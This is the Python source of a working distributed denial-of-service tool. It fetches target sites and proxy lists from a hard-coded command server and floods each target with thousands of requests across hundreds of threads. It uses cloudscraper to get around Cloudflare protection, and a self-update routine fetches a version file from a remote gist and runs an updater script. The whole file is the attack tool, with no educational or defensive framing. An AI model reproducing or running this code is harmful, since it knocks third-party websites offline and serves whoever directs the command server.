import json
import os
import platform
import sys
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from gc import collect
from os import system
from random import choice
from sys import stderr
from threading import Thread
from time import sleep
from urllib.parse import unquote

import cloudscraper
from loguru import logger
from pyuseragents import random as random_useragent
from requests.exceptions import ConnectionError
from urllib3 import disable_warnings

VERSION = 7
HOSTS = ["http://65.108.20.65"]
MAX_REQUESTS = 5000
SUPPORTED_PLATFORMS = {
    'linux': 'Linux'
}

disable_warnings()


def clear():
    if platform.system() == "Linux":
        return system('clear')
    else:
        return system('cls')


parser = ArgumentParser()
parser.add_argument('threads', nargs='?', default=500)
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.set_defaults(no_clear=False)
parser.set_defaults(proxy_view=False)
parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)
args, unknown = parser.parse_known_args()
no_clear = args.no_clear
proxy_view = args.proxy_view
threads = int(args.threads)

logger.remove()
logger.add(
    args.logger_output,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
        <cyan>{line}</cyan> - <white>{message}</white>")
logger.add(
    args.logger_results,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
        <cyan>{line}</cyan> - <white>{message}</white>",
    level="SUCCESS")


def checkReq():
    os.system("python3 -m pip install -r requirements.txt")
    os.system("python -m pip install -r requirements.txt")
    os.system("pip install -r requirements.txt")
    os.system("pip3 install -r requirements.txt")


def checkUpdate():
    logger.info("Checking Updates...")
    updateScraper = cloudscraper.create_scraper(
        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
    url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
    try:
        content = updateScraper.get(url).content
        if content:
            data = json.loads(content)
            new_version = data["version"]
            logger.info("Version: ", new_version)
            if int(new_version) > int(VERSION):
                logger.info("New version Available")
                os.system("python updater.py " + str(threads))
                os.system("python3 updater.py " + str(threads))
                exit()
        else:
            sleep(5)
            checkUpdate()
    except:
        sleep(5)
        checkUpdate()


def mainth():
    result = 'processing'
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
    scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
                           'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})

    while True:
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
        scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
                               'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
        logger.info("GET RESOURCES FOR ATTACK")
        host = choice(HOSTS)
        content = scraper.get(host).content
        if content:
            try:
                data = json.loads(content)
            except json.decoder.JSONDecodeError:
                logger.info('Host {} has invalid format'.format(host))
                sleep(5)
                continue
            except Exception:
                logger.exception('Unexpected error. Host {}'.format(host))
                sleep(5)
                continue
        else:
            sleep(5)
            continue
        logger.info("STARTING ATTACK ON " + data['site']['page'])
        site = unquote(data['site']['page'])
        if site.startswith('http') == False:
            site = "https://" + site

        attacks_number = 0

        try:
            attack = scraper.get(site)

            if attack.status_code >= 302:
                for proxy in data['proxy']:
                    if proxy_view:
                        logger.info('USING PROXY:' + proxy["ip"] +" "+ proxy["auth"])
                    scraper.proxies.update(
                        {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                    response = scraper.get(site)
                    if response.status_code >= 200 and response.status_code <= 302:
                        for i in range(MAX_REQUESTS):
                            response = scraper.get(site)
                            attacks_number += 1
                            logger.info("ATTACKED; RESPONSE CODE: " +
                                        str(response.status_code))
            else:
                for i in range(MAX_REQUESTS):
                    response = scraper.get(site)
                    attacks_number += 1
                    logger.info("ATTACKED; RESPONSE CODE: " +
                                str(response.status_code))
            if attacks_number > 0:
                logger.success("SUCCESSFUL ATTACKS on" + site + ": " + str(attacks_number))
        except ConnectionError as exc:
            logger.success(f"{site} is down: {exc}")
        except Exception as exc:
            result = f"issue happened: {exc}"
            logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
            continue
        finally:
            return result, site


def cleaner():
    while True:
        sleep(60)
        checkUpdate()

        if not no_clear:
            clear()
        collect()


if __name__ == '__main__':
    if not no_clear:
        clear()
    checkReq()
    checkUpdate()
    Thread(target=cleaner, daemon=True).start()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_tasks = [executor.submit(mainth) for _ in range(threads)]
        for task in as_completed(future_tasks):
            status, site = task.result()
            logger.info(f"{status.upper()}: {site}")
